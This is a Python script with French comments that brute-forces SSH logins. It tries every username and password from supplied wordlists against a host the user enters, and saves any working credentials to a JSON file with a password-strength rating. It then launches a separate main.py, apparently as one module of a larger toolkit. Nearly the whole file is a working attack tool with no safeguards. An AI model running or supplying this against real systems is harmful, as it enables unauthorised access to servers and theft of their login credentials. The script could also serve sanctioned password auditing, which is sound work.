import paramiko
import json
import os

def test_password_ssh(username, password, hostname, port=22, timeout=10):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Tente de se connecter au serveur SSH avec le nom d'utilisateur et le mot de passe fournis
        ssh.connect(hostname, port, username, password, timeout=timeout)
        # Si la connexion réussit, affiche le mot de passe
        print(f"Mot de passe trouvé pour l'utilisateur '{username}' sur '{hostname}': {password}")
        return True, username, password
        
    except paramiko.AuthenticationException:
        # Si l'authentification échoue, affiche un message
        print(f"Échec de l'authentification pour l'utilisateur '{username}' avec le mot de passe '{password}' sur '{hostname}'")
        return False, None, None
    
    except paramiko.SSHException as e:
        # Gère les erreurs SSH en affichant un message
        print(f"Erreur lors de la connexion SSH : {e}")
        return False, None, None
    
    finally:
        # Ferme la connexion SSH dans tous les cas
        ssh.close()

def check_password_strength(password):
    # Vérifie si le mot de passe a plus de 10 caractères, contient au moins un caractère spécial et au moins un chiffre
    if len(password) >= 10 and any(char.isdigit() for char in password) and any(char in "!@#$%^&*()_+{}[];:'\"<>,./?\\|`~-=" for char in password):
        return True
    else:
        return False

def main():
    # Demande à l'utilisateur s'il souhaite utiliser une liste de noms d'utilisateur à partir d'un fichier
    user_choice = input("Voulez-vous utiliser une liste de noms d'utilisateur à partir d'un fichier ? (oui/non) : ").lower()
    usernames = []
    if user_choice == "oui":
        # Demande à l'utilisateur de saisir le chemin vers le fichier contenant les noms d'utilisateur
        username_file = input("Entrez le chemin vers le fichier contenant les noms d'utilisateur : ")
        
        # Ouvre le fichier de noms d'utilisateur en lecture
        try:
            with open(username_file, 'r') as file:
                usernames = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"Erreur: Le fichier '{username_file}' est introuvable.")
    elif user_choice == "non":
        # Demande à l'utilisateur de saisir le nom d'utilisateur
        username = input("Entrez le nom d'utilisateur : ")
        if username:
            usernames.append(username)
    else:
        print("Choix invalide.")

    # Demande à l'utilisateur s'il souhaite utiliser une liste de mots de passe à partir d'un fichier
    password_choice = input("Voulez-vous utiliser une liste de mots de passe à partir d'un fichier ? (oui/non) : ").lower()
    passwords = []
    if password_choice == "oui":
        # Demande à l'utilisateur de saisir le chemin vers le fichier contenant les mots de passe
        password_file = input("Entrez le chemin vers le fichier contenant les mots de passe : ")
        
        # Ouvre le fichier de mots de passe en lecture
        try:
            with open(password_file, 'r') as file:
                passwords = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"Erreur: Le fichier '{password_file}' est introuvable.")
    elif password_choice == "non":
        # Demande à l'utilisateur de saisir le mot de passe
        password = input("Entrez le mot de passe : ")
        if password:
            passwords.append(password)
    else:
        print("Choix invalide.")

    # Demande à l'utilisateur de saisir l'adresse IP ou le nom d'hôte du serveur SSH
    hostname = input("Entrez l'adresse IP ou le nom d'hôte du serveur SSH : ")

    # Teste toutes les combinaisons d'utilisateur et de mot de passe
    found = False  # Variable de drapeau pour indiquer si la combinaison valide a été trouvée
    for user in usernames:
        for password in passwords:
            success, found_user, found_password = test_password_ssh(user, password, hostname)
            if success:
                found = True
                # Vérifie la force du mot de passe
                password_strength_msg = "Le mot de passe est assez fort." if check_password_strength(found_password) else "Le mot de passe n'est pas assez fort."
                # Si une combinaison valide est trouvée, stocke les données dans un fichier JSON avec le message de force du mot de passe
                data = {
                    "username": found_user,
                    "password": found_password,
                    "hostname": hostname,
                    "password_strength": password_strength_msg
                }
                with open("tmp-result/credentialsSSH.json", "w") as json_file:
                    json.dump(data, json_file, indent=4)
                break  # Si la combinaison valide a été trouvée, arrête la boucle

        if found:
            break  # Si la combinaison valide a été trouvée, arrête la boucle

    # Si aucune combinaison valide n'a été trouvée, affiche un message
    if not found:
        print("Aucune combinaison valide d'utilisateur et de mot de passe n'a été trouvée.")

    os.system("python main.py")

if __name__ == '__main__':
    main()
